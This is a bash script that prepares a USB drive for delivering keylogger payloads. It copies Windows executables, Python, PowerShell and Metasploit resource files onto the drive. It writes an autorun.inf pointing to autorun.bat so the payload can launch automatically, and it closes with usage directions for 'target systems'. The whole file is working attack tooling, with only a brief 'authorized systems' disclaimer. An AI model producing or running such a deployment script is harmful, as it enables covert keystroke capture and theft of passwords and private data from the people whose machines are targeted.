#!/bin/bash

# Quick USB Copy Script for Keylogger Payloads
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${GREEN}USB Copy Script for Keylogger Payloads${NC}"
echo "======================================"
echo ""

# Check for USB devices
echo "Scanning for USB devices..."
USB_DEVICES=$(lsblk -o NAME,SIZE,TYPE,MOUNTPOINT | grep -E "(disk|part)" | grep -v "disk.*$")

if [ -z "$USB_DEVICES" ]; then
    echo -e "${RED}No USB devices detected. Please insert a USB drive.${NC}"
    exit 1
fi

echo "Available storage devices:"
lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,LABEL

echo ""
read -p "Enter the device path (e.g., /dev/sdb1): " USB_DEVICE

if [ ! -b "$USB_DEVICE" ]; then
    echo -e "${RED}Invalid device path: $USB_DEVICE${NC}"
    exit 1
fi

# Check if already mounted
MOUNT_POINT=$(lsblk -no MOUNTPOINT "$USB_DEVICE")

if [ -z "$MOUNT_POINT" ]; then
    echo "USB device not mounted. Creating mount point..."
    sudo mkdir -p /mnt/usb_payloads
    sudo mount "$USB_DEVICE" /mnt/usb_payloads
    MOUNT_POINT="/mnt/usb_payloads"
    MOUNTED_BY_SCRIPT=true
else
    echo "USB device already mounted at: $MOUNT_POINT"
    MOUNTED_BY_SCRIPT=false
fi

echo ""
echo -e "${YELLOW}Copying keylogger payloads to USB...${NC}"

# Create organized directory structure
sudo mkdir -p "$MOUNT_POINT/keylogger_collection"
sudo mkdir -p "$MOUNT_POINT/keylogger_collection/payloads"
sudo mkdir -p "$MOUNT_POINT/keylogger_collection/documentation"
sudo mkdir -p "$MOUNT_POINT/keylogger_collection/launchers"

# Copy payload files
echo "Copying payload files..."
sudo cp *.exe "$MOUNT_POINT/keylogger_collection/payloads/" 2>/dev/null
sudo cp *.py "$MOUNT_POINT/keylogger_collection/payloads/" 2>/dev/null
sudo cp *.ps1 "$MOUNT_POINT/keylogger_collection/payloads/" 2>/dev/null
sudo cp *.rc "$MOUNT_POINT/keylogger_collection/payloads/" 2>/dev/null

# Copy documentation
echo "Copying documentation..."
sudo cp *.txt "$MOUNT_POINT/keylogger_collection/documentation/" 2>/dev/null
sudo cp *.md "$MOUNT_POINT/keylogger_collection/documentation/" 2>/dev/null

# Copy launchers
echo "Copying launchers..."
sudo cp autorun.bat "$MOUNT_POINT/keylogger_collection/launchers/" 2>/dev/null
sudo cp run_payload.sh "$MOUNT_POINT/keylogger_collection/launchers/" 2>/dev/null

# Copy everything to root for easy access too
echo "Copying files to root directory..."
sudo cp *.exe *.py *.ps1 *.rc *.bat run_payload.sh "$MOUNT_POINT/" 2>/dev/null

# Set permissions
sudo chmod +x "$MOUNT_POINT/run_payload.sh" 2>/dev/null
sudo chmod +x "$MOUNT_POINT/keylogger_collection/launchers/run_payload.sh" 2>/dev/null

# Create autorun.inf for Windows (if enabled)
echo "Creating Windows autorun.inf..."
sudo tee "$MOUNT_POINT/autorun.inf" > /dev/null << EOF
[autorun]
open=autorun.bat
icon=autorun.bat,1
label=Keylogger Test Suite

[Content]
MusicFiles=false
PictureFiles=false
VideoFiles=false
EOF

echo ""
echo -e "${GREEN}✓ Copy completed successfully!${NC}"
echo ""
echo "USB Contents:"
ls -la "$MOUNT_POINT/"

echo ""
echo -e "${YELLOW}USB Directory Structure Created:${NC}"
echo "keylogger_collection/"
echo "├── payloads/"
echo "│   ├── *.exe (Windows executables)"
echo "│   ├── *.py (Python payloads)"
echo "│   ├── *.ps1 (PowerShell scripts)"
echo "│   └── *.rc (Metasploit resource files)"
echo "├── documentation/"
echo "│   ├── README.md"
echo "│   ├── USB_DEPLOYMENT_GUIDE.txt"
echo "│   └── keylogger_commands.txt"
echo "└── launchers/"
echo "    ├── autorun.bat (Windows launcher)"
echo "    └── run_payload.sh (Linux launcher)"

echo ""
echo -e "${YELLOW}Files also copied to USB root for direct access${NC}"

# Sync and unmount if we mounted it
echo ""
echo "Syncing filesystem..."
sync

if [ "$MOUNTED_BY_SCRIPT" = true ]; then
    read -p "Unmount USB drive? (y/n): " UNMOUNT
    if [ "$UNMOUNT" = "y" ] || [ "$UNMOUNT" = "Y" ]; then
        sudo umount "$MOUNT_POINT"
        echo -e "${GREEN}USB drive unmounted safely.${NC}"
    fi
fi

echo ""
echo -e "${GREEN}USB preparation complete!${NC}"
echo ""
echo "Usage on target systems:"
echo "- Windows: Run autorun.bat or double-click payload files"
echo "- Linux:   Execute ./run_payload.sh"
echo "- Cross-platform: Use the appropriate payload for the target OS"
echo ""
echo -e "${RED}Remember: Only use on authorized systems!${NC}"